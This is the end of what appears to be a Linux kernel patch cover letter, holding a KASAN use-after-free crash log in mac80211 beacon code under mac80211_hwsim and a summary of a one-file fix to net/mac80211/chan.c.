[  291.102122][    C0]  __kmalloc_cache_noprof (/home/roxy/linux-block-patch/build/../include/linux/kasan.h:263 /home/roxy/linux-block-patch/build/../mm/slub.c:5419)
[  291.102494][    C0]  kernfs_fop_open (/home/roxy/linux-block-patch/build/../fs/kernfs/file.c:617)
[  291.102819][    C0]  do_dentry_open (/home/roxy/linux-block-patch/build/../fs/open.c:911)
[  291.103140][    C0]  vfs_open (/home/roxy/linux-block-patch/build/../fs/open.c:1079)
[  291.103423][    C0]  path_openat (/home/roxy/linux-block-patch/build/../include/linux/fsnotify.h:81 /home/roxy/linux-block-patch/build/../include/linux/fsnotify.h:113 /home/roxy/linux-block-patch/build/../include/linux/fsnotify.h:127 /home/roxy/linux-block-patch/build/../include/linux/fsnotify.h:446 /home/roxy/linux-block-patch/build/../fs/namei.c:4616 /home/roxy/linux-block-patch/build/../fs/namei.c:4855)
[  291.104034][    C0]  do_filp_open+0x19c/0x3b0
[  291.104326][    C0]  do_sys_openat2 (/home/roxy/linux-block-patch/build/../include/linux/err.h:92)
[  291.104646][    C0]  __x64_sys_openat (/home/roxy/linux-block-patch/build/../fs/open.c:1370 /home/roxy/linux-block-patch/build/../fs/open.c:1386 /home/roxy/linux-block-patch/build/../fs/open.c:1381 /home/roxy/linux-block-patch/build/../fs/open.c:1381)
[  291.104961][    C0]  do_syscall_64 (/home/roxy/linux-block-patch/build/../include/linux/entry-common.h:109 (discriminator 2) /home/roxy/linux-block-patch/build/../include/linux/entry-common.h:147 (discriminator 2) /home/roxy/linux-block-patch/build/../include/linux/entry-common.h:178 (discriminator 2) /home/roxy/linux-block-patch/build/../arch/x86/entry/syscall_64.c:89 (discriminator 2))
[  291.105285][    C0] page last free pid 5687 tgid 5687 stack trace:
[  291.105678][    C0]  free_unref_page+0x6a3/0x1050
[  291.105999][    C0]  qlist_free_all (/home/roxy/linux-block-patch/build/../mm/kasan/quarantine.c:176)
[  291.106294][    C0]  kasan_quarantine_reduce (/home/roxy/linux-block-patch/build/../mm/kasan/quarantine.c:286)
[  291.106641][    C0]  __kasan_slab_alloc (/home/roxy/linux-block-patch/build/../mm/kasan/common.c:350)
[  291.106967][    C0]  kmem_cache_alloc_noprof (/home/roxy/linux-block-patch/build/../include/linux/local_lock_internal.h:54 /home/roxy/linux-block-patch/build/../mm/slub.c:4743 /home/roxy/linux-block-patch/build/../mm/slub.c:4883 /home/roxy/linux-block-patch/build/../mm/slub.c:4905)
[  291.107327][    C0]  security_file_alloc (/home/roxy/linux-block-patch/build/../security/security.c:171 (discriminator 2) /home/roxy/linux-block-patch/build/../security/security.c:2406 (discriminator 2))
[  291.107680][    C0]  init_file (/home/roxy/linux-block-patch/build/../fs/file_table.c:183 (discriminator 1))
[  291.107955][    C0]  alloc_empty_file (/home/roxy/linux-block-patch/build/../fs/file_table.c:266)
[  291.108264][    C0]  path_openat (/home/roxy/linux-block-patch/build/../fs/namei.c:4844 (discriminator 1))
[  291.108570][    C0]  do_filp_open+0x19c/0x3b0
[  291.108871][    C0]  do_sys_openat2 (/home/roxy/linux-block-patch/build/../include/linux/err.h:92)
[  291.109183][    C0]  __x64_sys_openat (/home/roxy/linux-block-patch/build/../fs/open.c:1370 /home/roxy/linux-block-patch/build/../fs/open.c:1386 /home/roxy/linux-block-patch/build/../fs/open.c:1381 /home/roxy/linux-block-patch/build/../fs/open.c:1381)
[  291.109485][    C0]  do_syscall_64 (/home/roxy/linux-block-patch/build/../include/linux/entry-common.h:109 (discriminator 2) /home/roxy/linux-block-patch/build/../include/linux/entry-common.h:147 (discriminator 2) /home/roxy/linux-block-patch/build/../include/linux/entry-common.h:178 (discriminator 2) /home/roxy/linux-block-patch/build/../arch/x86/entry/syscall_64.c:89 (discriminator 2))
[  291.109784][    C0]  entry_SYSCALL_64_after_hwframe (/home/roxy/linux-block-patch/build/../arch/x86/entry/entry_64.S:121)
[  291.110175][    C0]
[  291.110325][    C0] Memory state around the buggy address:
[  291.110676][    C0]  ffff888023676780: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
[  291.111212][    C0]  ffff888023676800: fa fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[  291.111715][    C0] >ffff888023676880: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[  291.112233][    C0]                                ^
[  291.112561][    C0]  ffff888023676900: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[  291.113078][    C0]  ffff888023676980: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[  291.113593][    C0] ==================================================================
[  291.114351][    C0] Kernel panic - not syncing: KASAN: panic_on_warn set ...
[  291.114811][    C0] CPU: 0 UID: 0 PID: 0 Comm: swapper/0 Not tainted 6.12.95 #2
[  291.115280][    C0] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[  291.116080][    C0] Call Trace:
[  291.116291][    C0]  <IRQ>
[  291.116491][    C0]  panic (/home/roxy/linux-block-patch/build/../kernel/panic.c:108)
[  291.116756][    C0]  ? srso_alias_return_thunk (/home/roxy/linux-block-patch/build/../arch/x86/lib/retpoline.S:220)
[  291.117129][    C0]  ? __pfx_panic (/home/roxy/linux-block-patch/build/../kernel/panic.c:740)
[  291.117417][    C0]  ? asm_sysvec_apic_timer_interrupt (/home/roxy/linux-block-patch/build/../arch/x86/include/asm/idtentry.h:697)
[  291.117803][    C0]  ? srso_alias_return_thunk (/home/roxy/linux-block-patch/build/../arch/x86/lib/retpoline.S:220)
[  291.118174][    C0]  ? __ieee80211_beacon_add_tim.isra.0 (/home/roxy/linux-block-patch/build/../net/mac80211/tx.c:5054)
[  291.118590][    C0]  ? __ieee80211_beacon_add_tim.isra.0 (/home/roxy/linux-block-patch/build/../net/mac80211/tx.c:5054)
[  291.119006][    C0]  check_panic_on_warn (/home/roxy/linux-block-patch/build/../kernel/panic.c:527 (discriminator 1))
[  291.119328][    C0]  end_report (/home/roxy/linux-block-patch/build/../include/linux/srcu.h:634 /home/roxy/linux-block-patch/build/../include/trace/events/error_report.h:69 /home/roxy/linux-block-patch/build/../include/trace/events/error_report.h:69 /home/roxy/linux-block-patch/build/../mm/kasan/report.c:222)
[  291.119603][    C0]  kasan_report (/home/roxy/linux-block-patch/build/../mm/kasan/report.c:597)
[  291.119893][    C0]  ? __ieee80211_beacon_add_tim.isra.0 (/home/roxy/linux-block-patch/build/../net/mac80211/tx.c:5054)
[  291.120314][    C0]  __ieee80211_beacon_add_tim.isra.0 (/home/roxy/linux-block-patch/build/../net/mac80211/tx.c:5054)
[  291.120735][    C0]  __ieee80211_beacon_get (/home/roxy/linux-block-patch/build/../net/mac80211/tx.c:5733)
[  291.121091][    C0]  ieee80211_beacon_get_tim (/home/roxy/linux-block-patch/build/../net/mac80211/tx.c:5846)
[  291.121495][    C0]  ? __pfx_ieee80211_beacon_get_tim (/home/roxy/linux-block-patch/build/../net/mac80211/tx.c:5838)
[  291.121881][    C0]  ? srso_alias_return_thunk (/home/roxy/linux-block-patch/build/../arch/x86/lib/retpoline.S:220)
[  291.122242][    C0]  ? srso_alias_return_thunk (/home/roxy/linux-block-patch/build/../arch/x86/lib/retpoline.S:220)
[  291.122630][    C0]  ? srso_alias_return_thunk (/home/roxy/linux-block-patch/build/../arch/x86/lib/retpoline.S:220)
[  291.122998][    C0]  mac80211_hwsim_beacon_tx (/home/roxy/linux-block-patch/build/../drivers/net/wireless/virtual/mac80211_hwsim.c:2491)
[  291.123349][    C0]  ? srso_alias_return_thunk (/home/roxy/linux-block-patch/build/../arch/x86/lib/retpoline.S:220)
[  291.123708][    C0]  ? rcu_is_watching (/home/roxy/linux-block-patch/build/../include/linux/context_tracking.h:128 (discriminator 1) /home/roxy/linux-block-patch/build/../kernel/rcu/tree.c:752 (discriminator 1))
[  291.124030][    C0]  ? srso_alias_return_thunk (/home/roxy/linux-block-patch/build/../arch/x86/lib/retpoline.S:220)
[  291.124384][    C0]  ? trace_lock_acquire+0x145/0x1c0
[  291.124736][    C0]  __iterate_interfaces (/home/roxy/linux-block-patch/build/../net/mac80211/util.c:756)
[  291.125085][    C0]  ? __pfx_mac80211_hwsim_beacon_tx (/home/roxy/linux-block-patch/build/../drivers/net/wireless/virtual/mac80211_hwsim.c:2439)
[  291.125474][    C0]  ? __pfx_mac80211_hwsim_beacon_tx (/home/roxy/linux-block-patch/build/../drivers/net/wireless/virtual/mac80211_hwsim.c:2439)
[  291.125858][    C0]  ieee80211_iterate_active_interfaces_atomic (/home/roxy/linux-block-patch/build/../net/mac80211/util.c:808)
[  291.126314][    C0]  mac80211_hwsim_beacon (/home/roxy/linux-block-patch/build/../drivers/net/wireless/virtual/mac80211_hwsim.c:2526)
[  291.126644][    C0]  ? __pfx_mac80211_hwsim_beacon (/home/roxy/linux-block-patch/build/../drivers/net/wireless/virtual/mac80211_hwsim.c:4178)
[  291.127022][    C0]  __hrtimer_run_queues (/home/roxy/linux-block-patch/build/../include/trace/events/timer.h:308 (discriminator 14) /home/roxy/linux-block-patch/build/../kernel/time/hrtimer.c:1933 (discriminator 14) /home/roxy/linux-block-patch/build/../kernel/time/hrtimer.c:1994 (discriminator 14))
[  291.127376][    C0]  ? __pfx___hrtimer_run_queues (/home/roxy/linux-block-patch/build/../kernel/time/hrtimer.c:1177)
[  291.127735][    C0]  ? srso_alias_return_thunk (/home/roxy/linux-block-patch/build/../arch/x86/lib/retpoline.S:220)
[  291.128102][    C0]  ? ktime_get_update_offsets_now (/home/roxy/linux-block-patch/build/../kernel/time/timekeeping.c:2725 (discriminator 2))
[  291.128493][    C0]  hrtimer_run_softirq (/home/roxy/linux-block-patch/build/../kernel/time/hrtimer.c:2011)
[  291.128822][    C0]  handle_softirqs (/home/roxy/linux-block-patch/build/../include/linux/kernel_stat.h:62 (discriminator 1) /home/roxy/linux-block-patch/build/../kernel/softirq.c:619 (discriminator 1))
[  291.129142][    C0]  ? __pfx_handle_softirqs (/home/roxy/linux-block-patch/build/../kernel/softirq.c:405)
[  291.129481][    C0]  ? srso_alias_return_thunk (/home/roxy/linux-block-patch/build/../arch/x86/lib/retpoline.S:220)
[  291.129845][    C0]  irq_exit_rcu (/home/roxy/linux-block-patch/build/../kernel/softirq.c:801)
[  291.130135][    C0]  sysvec_apic_timer_interrupt (/home/roxy/linux-block-patch/build/../arch/x86/kernel/apic/apic.c:1061 (discriminator 35) /home/roxy/linux-block-patch/build/../arch/x86/kernel/apic/apic.c:1061 (discriminator 35))
[  291.130490][    C0]  </IRQ>
[  291.130682][    C0]  <TASK>
[  291.130877][    C0]  asm_sysvec_apic_timer_interrupt (/home/roxy/linux-block-patch/build/../arch/x86/include/asm/idtentry.h:697)
[  291.131268][    C0] RIP: 0010:pv_native_safe_halt (/home/roxy/linux-block-patch/build/../arch/x86/include/asm/irqflags.h:48 /home/roxy/linux-block-patch/build/../arch/x86/kernel/paravirt.c:62)
[  291.131633][    C0] Code: c5 60 02 e9 6e 34 1e 00 0f 1f 00 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 f3 0f 1e fa eb 07 0f 00 2d 03 42 37 00 fb f4 <e9> 47 34 1e 00 66 2e 0f 1f 84 00 00 00 00 00 66 90 90 90 90 90 90
All code
========
   0:	c5 60 02             	(bad)
   3:	e9 6e 34 1e 00       	jmp    0x1e3476
   8:	0f 1f 00             	nopl   (%rax)
   b:	90                   	nop
   c:	90                   	nop
   d:	90                   	nop
   e:	90                   	nop
   f:	90                   	nop
  10:	90                   	nop
  11:	90                   	nop
  12:	90                   	nop
  13:	90                   	nop
  14:	90                   	nop
  15:	90                   	nop
  16:	90                   	nop
  17:	90                   	nop
  18:	90                   	nop
  19:	90                   	nop
  1a:	90                   	nop
  1b:	f3 0f 1e fa          	endbr64
  1f:	eb 07                	jmp    0x28
  21:	0f 00 2d 03 42 37 00 	verw   0x374203(%rip)        # 0x37422b
  28:	fb                   	sti
  29:	f4                   	hlt
  2a:*	e9 47 34 1e 00       	jmp    0x1e3476		<-- trapping instruction
  2f:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  36:	00 00 00 
  39:	66 90                	xchg   %ax,%ax
  3b:	90                   	nop
  3c:	90                   	nop
  3d:	90                   	nop
  3e:	90                   	nop
  3f:	90                   	nop

Code starting with the faulting instruction
===========================================
   0:	e9 47 34 1e 00       	jmp    0x1e344c
   5:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   c:	00 00 00 
   f:	66 90                	xchg   %ax,%ax
  11:	90                   	nop
  12:	90                   	nop
  13:	90                   	nop
  14:	90                   	nop
  15:	90                   	nop
[  291.132861][    C0] RSP: 0018:ffffffff8de07e20 EFLAGS: 00000282
[  291.133262][    C0] RAX: 000000000016fcb7 RBX: 0000000000000000 RCX: ffffffff8a5222e5
[  291.133757][    C0] RDX: 0000000000000000 RSI: ffffffff8a8c46a0 RDI: ffffffff8aee7960
[  291.134269][    C0] RBP: ffffffff8de95b80 R08: 0000000000000001 R09: ffffed1023147031
[  291.134762][    C0] R10: ffff888118a3818b R11: 0000000000000000 R12: 0000000000000000
[  291.135276][    C0] R13: fffffbfff1bd2b70 R14: 0000000000000000 R15: ffffffff904e92c8
[  291.135778][    C0]  ? ct_kernel_exit (/home/roxy/linux-block-patch/build/../include/linux/instrumented.h:97 /home/roxy/linux-block-patch/build/../kernel/context_tracking.c:124)
[  291.136119][    C0]  default_idle (/home/roxy/linux-block-patch/build/../arch/x86/kernel/process.c:769)
[  291.136398][    C0]  default_idle_call (/home/roxy/linux-block-patch/build/../include/linux/cpuidle.h:143 (discriminator 1) /home/roxy/linux-block-patch/build/../kernel/sched/idle.c:123 (discriminator 1))
[  291.136702][    C0]  do_idle (/home/roxy/linux-block-patch/build/../arch/x86/include/asm/bitops.h:55 /home/roxy/linux-block-patch/build/../include/linux/sched/idle.h:26 /home/roxy/linux-block-patch/build/../kernel/sched/idle.c:264 /home/roxy/linux-block-patch/build/../kernel/sched/idle.c:352)
[  291.136977][    C0]  ? __pfx_do_idle (/home/roxy/linux-block-patch/build/../kernel/sched/idle.c:87)
[  291.137281][    C0]  cpu_startup_entry (/home/roxy/linux-block-patch/build/../kernel/sched/idle.c:447 (discriminator 1))
[  291.137604][    C0]  rest_init (/home/roxy/linux-block-patch/build/../init/main.c:752)
[  291.137875][    C0]  ? srso_alias_return_thunk (/home/roxy/linux-block-patch/build/../arch/x86/lib/retpoline.S:220)
[  291.138238][    C0]  start_kernel (/home/roxy/linux-block-patch/build/../init/main.c:1181)
[  291.138531][    C0]  x86_64_start_reservations (/home/roxy/linux-block-patch/build/../arch/x86/kernel/head64.c:310)
[  291.138931][    C0]  x86_64_start_kernel (/home/roxy/linux-block-patch/build/../arch/x86/kernel/head64.c:245)
[  291.139279][    C0]  common_startup_64 (/home/roxy/linux-block-patch/build/../arch/x86/kernel/head_64.S:418)
[  291.139604][    C0]  </TASK>
[  291.140034][    C0] Kernel Offset: disabled
[  291.140347][    C0] Rebooting in 86400 seconds..

-----END crash log-----

Best regards,
Zhiling Zou

Zhiling Zou (1):
  wifi: mac80211: count only matching reservations in reserved switch

 net/mac80211/chan.c | 30 +++++++++++++++++++++++-------
 1 file changed, 23 insertions(+), 7 deletions(-)

-- 
2.43.0
